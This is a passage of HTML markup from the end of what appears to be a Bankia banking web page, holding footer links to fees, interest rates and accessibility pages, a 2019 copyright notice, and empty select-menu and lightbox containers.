                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/tarifas"> <span class="ftr-modLinks-link-txt">Tarifas</span></a></li>
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/tablon-de-anuncios"> <span class="ftr-modLinks-link-txt">Tablón de anuncios</span></a></li>
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/comisiones-tipos-de-interes-y-de-cambio"> <span class="ftr-modLinks-link-txt">Comisiones, Tipos de Interés y de cambio</span></a></li>
                                                        <li class="ftr-modLinks-input"><a hreflang="es" tabindex="0" class="ftr-modLinks-link" rel="nofollow" href="https://www.bankia.es/es/particulares/accesibilidad"> <span class="ftr-modLinks-link-txt">Accesibilidad</span></a></li>
                                                    </ul>
                                                </div>
                                                <div class="col-xs-12 col-md-12 col-lg-12">
                                                    <div class="ftr-modLinks-list">
                                                        <div class="ftr-modLinks-input-name">
                                                            <p class="ftr-modLinks-link">© 2019 Bankia, S.A. Todos los derechos reservados.</p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </footer>

                    </div>


                </div>




            </div>

        </main>




    </div>


  





    <!-- SEO Breadcrumb -->


    <!-- SEO Organization -->


    <div class="ui-selectmenu-menu ui-front ui-selectmenu-menu-head ui-selectmenu-menu-help">
        <ul aria-hidden="true" aria-labelledby="ui-id-1-button" id="ui-id-1-menu" class="ui-menu ui-widget ui-widget-content ui-corner-bottom" role="listbox" tabindex="0"></ul>
    </div>
    <div class="ui-selectmenu-menu ui-front ui-selectmenu-menu-head">
        <ul aria-hidden="true" aria-labelledby="language-switcher-button" id="language-switcher-menu" class="ui-menu ui-widget ui-widget-content ui-corner-bottom" role="listbox" tabindex="0"></ul>
    </div>
    <div id="cboxOverlay" style="display: none;"></div>
    <div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;">
        <div id="cboxWrapper">
            <div>
                <div id="cboxTopLeft" style="float: left;"></div>
                <div id="cboxTopCenter" style="float: left;"></div>
                <div id="cboxTopRight" style="float: left;"></div>
            </div>
            <div style="clear: left;">
                <div id="cboxMiddleLeft" style="float: left;"></div>
                <div id="cboxContent" style="float: left;">
                    <div id="cboxTitle" style="float: left;"></div>
                    <div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button>
                    <div id="cboxLoadingOverlay" style="float: left;"></div>
                    <div id="cboxLoadingGraphic" style="float: left;"></div>
                </div>
                <div id="cboxMiddleRight" style="float: left;"></div>
            </div>
            <div style="clear: left;">
                <div id="cboxBottomLeft" style="float: left;"></div>
                <div id="cboxBottomCenter" style="float: left;"></div>
                <div id="cboxBottomRight" style="float: left;"></div>
            </div>
        </div>
        <div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div>
    </div>
  
</body>

</html>